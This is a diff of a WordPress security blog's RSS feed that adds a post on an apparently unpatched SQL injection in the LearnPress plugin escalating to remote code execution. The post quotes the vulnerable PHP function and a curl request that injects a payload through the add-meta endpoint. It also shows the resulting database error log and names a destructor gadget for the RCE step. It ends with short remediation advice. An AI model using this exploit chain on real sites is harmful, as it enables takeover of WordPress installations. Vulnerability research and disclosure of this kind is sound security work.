@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Sat, 18 Jul 2020 23:41:59 +0000</lastBuildDate>
+	<lastBuildDate>Tue, 21 Jul 2020 21:02:46 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,122 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>LearnPress SQLi to RCE</title>
+		<link>https://wpdeeply.com/learnpress-sqli-to-rce/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Tue, 21 Jul 2020 21:02:44 +0000</pubDate>
+				<category><![CDATA[plugins]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=167</guid>
+
+					<description><![CDATA[Few months back security research regarding WP learning platforms got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE. Eli5 PoC Into function&#160;learn_press_duplicate_post_meta&#160;which is called from&#160;learn_press_duplicate_post&#160;we have the following: From [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>Few months back <a href="https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/" target="_blank" rel="noreferrer noopener">security research regarding WP learning platforms</a> got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE.</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#eli5-poc"></a>Eli5 PoC</h2>
+
+
+
+<p>Into function&nbsp;<code>learn_press_duplicate_post_meta</code>&nbsp;which is called from&nbsp;<code>learn_press_duplicate_post</code>&nbsp;we have the following:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">	function learn_press_duplicate_post_meta( $old_post_id, $new_post_id, $excerpt = array() ) {
+		global $wpdb;
+		$post_meta_infos = $wpdb->get_results( "SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$old_post_id" );
+		if ( count( $post_meta_infos ) != 0 ) {
+			$excerpt       = array_merge( array( '_edit_lock', '_edit_last' ), $excerpt );
+			$excerpt       = apply_filters( 'learn_press_excerpt_duplicate_post_meta', $excerpt, $old_post_id, $new_post_id );
+			$sql_query     = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
+			$sql_query_sel = array();
+			foreach ( $post_meta_infos as $meta ) {
+				if ( in_array( $meta->meta_key, $excerpt ) ) {
+					continue;
+				}
+				if ( $meta->meta_key === '_lp_course_author' ) {
+					$meta->meta_value = get_current_user_id();
+				}
+				$meta_key        = $meta->meta_key;
+				$meta_value      = addslashes( $meta->meta_value );
+				$sql_query_sel[] = "SELECT $new_post_id, '$meta_key', '$meta_value'";
+			}
+			$sql_query .= implode( " UNION ALL ", $sql_query_sel );
+			$wpdb->query( $sql_query );
+		}
+	}
+</code></pre>
+
+
+
+<p>From previous reports&nbsp;<code>$meta_value</code>&nbsp;was reported as SQLi vulnerable parameter, but&nbsp;<code>$meta_key</code>&nbsp;wasn&#8217;t?! Having on mind that we talk about WP then we all know that if we have permissions to edit post, then we have permissions to add custom fields (meta fields)</p>
+
+
+
+<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.setup/wp-admin/admin-ajax.php' --data $'_ajax_nonce=0&amp;action=add-meta&amp;metakeyselect=%23NONE%23&amp;metakeyinput=sqli\'payload&amp;metavalue=anything&amp;_ajax_nonce-add-meta=47cfdb164d&amp;post_id=[lesson_id]'
+</code></pre>
+
+
+
+<p>In order to execute the SQLi and to be able to insert custom/meta field with any meta value, we need only to duplicate the lesson. Then we have the following <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<pre class="wp-block-code"><code class="">[Tue Jul 21 22:16:08.289659 2020] [:error] [pid 24069] [client ::1:47077] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'boom'' at line 1 for query INSERT INTO wp_postmeta (post_id, meta_key, meta_value) SELECT 107, 'count_items', '0' UNION ALL SELECT 107, '_lp_duration', '30 minute' UNION ALL SELECT 107, '_lp_preview', 'no' UNION ALL SELECT 107, 'boom'test', 'boom' made by require_once('wp-admin/admin.php')... LP_Lesson_CURD->duplicate, learn_press_duplicate_post, learn_press_duplicate_post_meta
+</code></pre>
+
+
+
+<p>What we can achieve with possibility to insert any meta value? Well that depends of plugin itself and WP setup. If we check the LearnPress code then we can notice following in&nbsp;<code>learnpress.php</code>:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">require_once 'inc/class-lp-debug.php';
+</code></pre>
+
+
+
+<p>and this is important because:</p>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">public function __destruct() {
+		if ( ! $this->_handles ) {
+			return;
+		}
+		foreach ( $this->_handles as $handle ) {
+			@fclose( $handle );
+		}
+	}
+</code></pre>
+
+
+
+<p>e.g. <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">same situation as WooCommerce</a> => hello RCE <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li>I tried to warn researchers</li><li>Do not allow interesting gadget chains in your PHP code</li><li>Limit what could be unserialized in your php.ini</li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#remediation"></a>Remediation</h2>
+
+
+
+<ul><li>Do not allow SQLi in your code <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>Do not trust input</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WooCommerce MySQL replace to RCE</title>
 		<link>https://wpdeeply.com/woocommerce-mysql-replace-to-rce/</link>
 		
